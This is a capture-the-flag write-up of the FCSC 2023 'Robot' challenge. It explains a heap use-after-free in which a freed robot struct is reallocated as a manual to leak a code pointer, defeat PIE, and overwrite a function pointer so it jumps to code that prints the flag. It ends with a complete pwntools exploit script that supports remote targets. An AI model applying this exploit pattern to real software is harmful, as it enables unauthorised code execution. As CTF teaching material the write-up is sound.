+++
title = "FCSC 2023 | Robot"
+++

# Intro
So, first in first what does we have to do ? After a fast analyse of the source code we can see that the function who's interesting is `admin`:

```c
void admin(char *pwd)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
	char result[65];

	SHA256((const unsigned char *) pwd, strlen(pwd), hash);

	for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
		sprintf(result + (i * 2), "%02x", hash[i]);
	}

	if (rstcmp(result, encrypted) == 0) {
		execl("/bin/cat", "/bin/cat", "flag.txt", NULL);
		perror("execl");
		exit(2);
	} else {
		puts("ERROR: wrong password!");
	}
}
```

it's a comparaison between our input hashed and a predefined hash, we don't are in a crypto chall so we don't care about that, our objective is to jump directly to the execl to print the flag.

# Exploitation

## Actual situation
Now it's exploit time ! In first we can see that when a user create a robot, this robot is stored in the heap, to do this the program alloc a `struct` called `robot` who contains one chars of 16bits and two pointers so the chunk allocated will be of `32bytes` other interesting things is that when we read the manual the program will read the 32bits of the first chunk stored !

## Exploit - leak
So now, we can understand how we are going to exploit this thing !

In first we going to allocate a first chunk by create a new robot so the heap will look like this:
```
+--------------------+
|        HEAP        |
+--------------------+
|       name[16]     |
|       *bleep       |  32 bits
|       *rool        |
+--------------------+
```

the we free the bloc so free will rewrite first byte but ptr will stay so, if we create a new manuel we'll rewrite the previous bloc so we juste have to rewrite of 16 bits to rewrite only the metadata and the username, our chunk will look like this:
```
+--------------------+
|        HEAP        |
+--------------------+
|        manuel      |
|       *bleep       |  32 bits
|       *rool        |
+--------------------+
```

now, if we read the manuel we'll leak the ptr, now we have leak the soft to bypass PIE we can now calculate the offset to go to our `execl` and then what's we'll do ?!

## New situation
OK ! now we have leaked what's we want so we can exploit it but how ?! if you remember in the struct we defind pointer, this pointers are called by our program to make some actions so we can rewrite one of this, the we triger actions and then we print the flag ! let's do this !

## Exploit - CE

So, now our heap look like this
```
+--------------------+
|        HEAP        |
+--------------------+
|        manuel      |
|       *bleep       |  32 bits
|       *rool        |
+--------------------+
```

so we're going to create a new robot and heap look like this
```
+--------------------+
|        HEAP        |
+--------------------+
|       name[16]     |
|       *bleep       |  32 bits
|       *rool        |
+--------------------+
```

we create a new manuel and write 16 bits and then our address, so our chunk will look like this
```
+--------------------+
|        HEAP        |
+--------------------+
|       name[16]     |
|       *execl       |  32 bits
|       *roll        |
+--------------------+
```

then trigered the `bleep` function by typing 2 and tada ! we got our flag !

# Exploitation - exploit

```python
#!/bin/python
from pwn import *
from sys import argv

def recv_header(io):
    io.recvline()
    for i in range(4):
        io.recvline()

def create(io, data="Botman"):
    recv_header(io)
    io.sendline(b'1')
    io.sendlineafter(b"> Comment vous l'appelez ?\n", data)
    io.recvline()
    io.recvline()
    return 'robot created'

def manuel(io, data="data"):
    recv_header(io)
    io.sendline(b'4')
    io.sendlineafter(b"Vous commencez \xc3\xa0 r\xc3\xa9diger le mode d'emploi...\n", data)
    io.recvline()
    return 'manuel created'

def delete(io):
    recv_header(io)
    io.sendline(b'3')
    for i in range(3):
        io.recvline()
    return 'robot deleted'

def show(io):
    recv_header(io)
    io.sendline(b'2')
    return io.recvline()

def read(io):
    recv_header(io)
    io.sendline(b"5")
    io.recvline()
    return io.recvline()

def exploit(io, elf):
    create(io, b"A"*16)
    delete(io)
    manuel(io, b"A"*16)
    leak = read(io)
    leak = leak[leak.index(b'\xfc'):][:-2]

    hex_values = [hex(byte)[2:].zfill(2) for byte in leak if byte != 0]
    hex_string = bytes.fromhex((''.join(hex_values)))[:8][::-1]
    hex_int = int.from_bytes(hex_string, 'big')
    leak = int(f'0x0000{hex_int:012x}', 16)

    flag = leak + 0x180
    
    print("leak :" + hex(leak))
    print("flag :" + hex(flag))

    create(io, b"A"*16)
    delete(io)
    manuel(io, b"A"*16 + p64(flag))
    print(show(io))

if __name__ == "__main__":
    usage = '''
usage: ./exploit.py [binary] ?debug
       ./exploit.py remote [binary] [ip] [port] ?debug
       ./exploit.py [binary] ?gdb [command]

       default command = 'continue'
'''

    if len(argv) <= 1:
        print('error: no arguments specified\n'+usage)
        exit(0)

    elif len(argv) <= 5 and argv[1] != 'remote':
        context.binary = elf = ELF(argv[1])
        context.terminal = ["tmux", "splitw", '-h']
        p = process()
        if "gdb" in argv: gdb.attach(p, argv[-1]) if argv[-1] != 'gdb' else gdb.attach(p, 'continue')
        if "debug" in argv: context.log_level = "DEBUG"
        exploit(p,elf)
    elif len(argv) <= 6 and argv[1] == "remote":
        context.binary = elf = ELF(argv[2])
        p = remote(argv[3], int(argv[4]))
        if "debug" in argv: context.log_level = "DEBUG"
        exploit(p, elf)
    elif len(argv) > 5:
        print('error: too much params specified\n' + usage)
        exit(0)
    elif len(argv) <= 3:
        print('error: you forgot ip or/and port\n' + usage)
        exit(0)
    else:
        print(usage)
```